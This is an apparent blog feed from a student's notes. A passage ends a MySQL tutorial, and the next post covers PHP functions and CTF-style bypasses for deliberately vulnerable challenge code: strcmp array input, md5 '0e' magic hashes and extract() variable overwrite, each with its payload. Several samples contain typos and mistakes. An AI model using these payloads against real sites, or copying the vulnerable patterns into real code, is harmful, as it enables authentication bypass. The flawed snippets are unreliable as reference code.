title="sum函数"></a>sum函数</h5><p>sum函数返回所选按字段的合计值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="其他一些条件"><a href="#其他一些条件" class="headerlink" title="其他一些条件"></a>其他一些条件</h3><h5 id="having过滤分组"><a href="#having过滤分组" class="headerlink" title="having过滤分组"></a>having过滤分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having 统计函数 运算符 value；<br></code></pre></td></tr></table></figure><h5 id="group-by分组"><a href="#group-by分组" class="headerlink" title="group by分组"></a>group by分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h5><p>可分为正序asc和倒序desc两种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [排序方法],[column_name] [排序方法],······;   <br></code></pre></td></tr></table></figure><h5 id="限制查询数量"><a href="#限制查询数量" class="headerlink" title="限制查询数量"></a>限制查询数量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [查询数量]<br></code></pre></td></tr></table></figure><h4 id="多表联合"><a href="#多表联合" class="headerlink" title="多表联合"></a>多表联合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHERE子句<br></code></pre></td></tr></table></figure><h5 id="jion连接"><a href="#jion连接" class="headerlink" title="jion连接"></a>jion连接</h5><p>jion连接是基于多个表之间的共同字段把他们结合起来进行查询的一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] JION [table_name2] + ON 子句;<br></code></pre></td></tr></table></figure><h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><p>列出两个表中都存在的数据<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h5><p>即使没有匹配也要列出左表的数据<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h5><p>即使没有匹配也要列出右表的数据<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SQL语句格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECT语句] [WHERE条件] [GROUP BY条件] [HAVING条件] [ORDER BY条件] [LIMIT条件]；<br></code></pre></td></tr></table></figure><hr><p>终于把这SQL语句搞完了</p><p>撒花🎉</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP黑魔法</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>古娜拉黑暗之神🪄</p><span id="more"></span><h2 id="PHP基础函数"><a href="#PHP基础函数" class="headerlink" title="PHP基础函数"></a>PHP基础函数</h2><p>接着上一篇小bug，把那些也提溜过来继续写🧐</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() 函数从<strong>数组</strong>中将变量导入到当前的符号表。该函数使用数组<strong>键名</strong>作为变量名，使用数组<strong>键值</strong>作为变量值。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array（数组名）</td><td>规定要使用的数组</td></tr><tr><td>extract_rules（提取规则）</td><td>可省略。<em>extract()</em> 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td></tr><tr><td>prefix（前缀）</td><td>可省略。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</td></tr></tbody></table><p><strong><em>extract_rules</em>可能的值：</strong></p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$var为要测试的变量</p></blockquote><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量已设置&quot;</span><br>&#125;<br><span class="hljs-comment">//结果为true，将打印文本</span><br><br><span class="hljs-comment">//使用var_dump输出isset()的返回值。</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//删除变量a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>变量已设置<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() 把整个文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#输出演示</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(输出文件中的所有文本)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>把两个字符串以二进制方式进行比较，且该函数比较时区分大小写。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p><code>strcmp(string1, string2)</code></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果返回值小于0，则str1小于str2;</p><p>如果返回值大于0，则str1大于str2;</p><p>如果返回值等于0，则str1等于str2;</p><blockquote><p>有资料说返回值也不仅是-1和1，也可能是其他数据</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//输出0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//输出1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>还有个函数strcasecmp()，用法与strcmp()类似，只是不区分大小写</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>和<code>preg_match()</code>是PHP中常用的正则表达式。</p><p><strong>紧急补课—正则表达式</strong></p><p>在编写处理字符串的程序或者网页的时候，经常会查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的语法。</p><p>作用： 分割， 匹配， 查找， 替换</p><p>例如： 验证邮箱地址格式， 手机号码格式等等</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : 正则表达式</p><p>subject : 需要验证的字符串</p><p>matches&#x2F;regs : 匹配后得到的结果，以数组的方式存储</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>返回值是<strong>false</strong>或<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式分隔符后的i标记这是一个大小写不敏感的搜索</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串&quot;</span>；<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串&quot;</span>；<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示1：<br>查找到匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2：</span><br><span class="hljs-comment">//查找固定的某个单词</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式中的 \b 标记一个单词边界，所以只有独立的单词会被匹配，而不会匹配单词的部分内容 </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示2：<br>查找到匹配字符串<br>未发现匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#实例演示3：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从URL中获取主机名称</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// 获取主机名称的后面两部分</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示3：<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>乱七八糟一堆符号我一个都看不懂我好得很哇</del></p><h2 id="魔法部分"><a href="#魔法部分" class="headerlink" title="魔法部分"></a>魔法部分</h2><p>警告：麻瓜请自觉退出🚫</p><h3 id="01-strcmp绕过"><a href="#01-strcmp绕过" class="headerlink" title="01 strcmp绕过"></a>01 strcmp绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ps：从ws那里copy来的（x</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>，就是要**$_GET<strong>变量和</strong>FLAG**相等，但是我们除了严刑逼供出题人，根本就不知道FLAG是什么。</p><blockquote><p>$_GET[‘flag’]意思是从url获取一个叫flag的GET参数</p></blockquote><p>不要害怕！</p><p><strong>当 strcmp() 比较出错时会返回 NULL；而返回 NULL 即为返回 0</strong>，我们只需要palyload一个非字符串变量和字符串FLAG比较就会出错并返回0。</p><p>欸，相等辣！</p><p><strong>最终palyload</strong>： <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5绕过"><a href="#02-md5绕过" class="headerlink" title="02 md5绕过"></a>02 md5绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我 :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>，就是变量s1和s2<strong>不能相等</strong>但是他们的<strong>md5要相等</strong>。</p><p>因为s2和s2不能相等，所以单纯md5加密得出的密文一定也不完全一样，这时就要利用一些歪门邪道<del>（不是）</del>。</p><p><strong>紧急补课—md5</strong></p><p>md5一种密码散列函数。MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p><del>补不了我看不懂</del>🥲</p><h5 id="001-科学计数法绕过"><a href="#001-科学计数法绕过" class="headerlink" title="001 科学计数法绕过"></a>001 科学计数法绕过</h5><p>字符串经过md5加密后，会生成既有数字又有字母的密文，可以利用<strong>科学计数法</strong>的语法规律反推明文。</p><blockquote><p>了解到md5是不可逆的所以应该不能解码，但是可以根据加密规律找满足需要的明文</p></blockquote><p>0无论乘十的几次方都仍然为零，例如<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>。所以只需要找到两个经过md5加密后以<strong>”0e“</strong>开头的字符串充当变量即可。</p><p>copy了一些加密后是0e开头的值：</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>最终playload</strong>：<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>没有成功截图😣</p><p>不知道为什么自己运行的时候没成功，页面一片空白什么都没输出。</p><p><strong>紧急补课</strong></p><p>在php中，**’<em>x</em>e<em>y</em>‘** 意为x乘10的y次方。例如：1000 &#x3D;&#x3D; ‘1e3’。</p><h5 id="002-数组绕过"><a href="#002-数组绕过" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h5><p>冲浪冲到的</p><p>php中的md5函数不能用来加密数组，所以会出现结果NULL。例如<code>md5([1,2]) == md5([3,4]) == NULL</code>。</p><p><strong>最终playload</strong>：<code>?s1[]=1&amp;s2[]=2</code></p><p>但是在我的电脑上复现会报错而不是直接null绕过。</p><h3 id="03-extract-变量覆盖绕过"><a href="#03-extract-变量覆盖绕过" class="headerlink" title="03 extract 变量覆盖绕过"></a>03 extract 变量覆盖绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifier终将否极泰来&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目使用<code>extract($_GET)</code>接受请求，并将其键名和键值转换为变量名和变量值，随后进行if条件的判断。$flag是一个输入的变量，<code>file_get_contents($flag)</code>打开的一定是空文件，所以<code>$content</code>一定为空</p><blockquote><p>解题关键在于令$shiyan&#x3D;&#x3D;$content</p></blockquote><p>使用GET提交参数和值，利用<code>extract($_GET)</code>进行覆盖，使flag和shiyan的值都为空，从而满足if条件，输出flag。</p><p><strong>最终payload</strong>：<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-绕过过滤的空白字符"><a href="#04-绕过过滤的空白字符" class="headerlink" title="04 绕过过滤的空白字符"></a>04 绕过过滤的空白字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 